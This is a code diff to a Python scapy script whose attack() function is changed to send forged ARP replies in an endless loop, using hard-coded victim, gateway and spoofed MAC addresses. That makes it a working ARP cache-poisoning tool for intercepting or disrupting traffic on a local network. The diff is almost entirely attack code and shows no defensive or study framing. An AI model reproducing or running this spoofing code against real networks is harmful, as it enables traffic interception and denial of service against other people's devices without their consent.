@@ -1,6 +1,7 @@
 from scapy.all import *
 import netifaces
 from termcolor import colored
+import time
 
 
 def has_root():
@@ -47,14 +48,15 @@ def call_connected():
 def attack():
      get_gateway_address()
      if len(clients) > 1:
-          packet = ARP(
-               op=1,
-               pdst = clients[1]["ip"],
-               hwdst = clients[1]["mac"],
-               psrc = gateway_address,
-               hwsrc='12:04:56:78:9a:bc'
-          )
-          send(packet, verbose=False)
+          while True:
+               packet = ARP(
+                    op=2,
+                    pdst = '192.168.10.106',
+                    hwdst = '54:35:30:e5:1a:cd',
+                    psrc = '192.168.10.100',
+                    hwsrc = '80:22:e6:34:1a:bd'
+               )
+               send(packet, verbose=False)
      else:
           print(colored("No devices to attack", "red"))
 
